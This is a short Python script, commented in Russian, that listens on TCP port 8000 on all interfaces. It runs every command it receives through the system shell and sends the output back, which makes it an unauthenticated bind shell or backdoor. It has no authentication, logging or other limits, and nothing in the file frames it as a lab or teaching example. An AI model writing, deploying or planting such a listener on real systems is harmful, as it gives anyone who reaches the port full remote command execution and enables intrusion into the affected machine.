import socket
import subprocess

# Настройки сервера
HOST = '0.0.0.0'  # Слушать все адреса
PORT = 8000       # Порт для подключения

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)
print(f"Сервер запущен. Ожидание подключения на порту {PORT}...")

conn, addr = server_socket.accept()
print(f"Подключение от: {addr}")

while True:
    try:
        # Получение команды
        command = conn.recv(1024).decode()
        if command.lower() == 'exit':
            print("Закрытие соединения.")
            break

        # Выполнение команды
        output = subprocess.getoutput(command)
        conn.send(output.encode())
    except Exception as e:
        conn.send(f"Ошибка: {e}".encode())

conn.close()
server_socket.close()
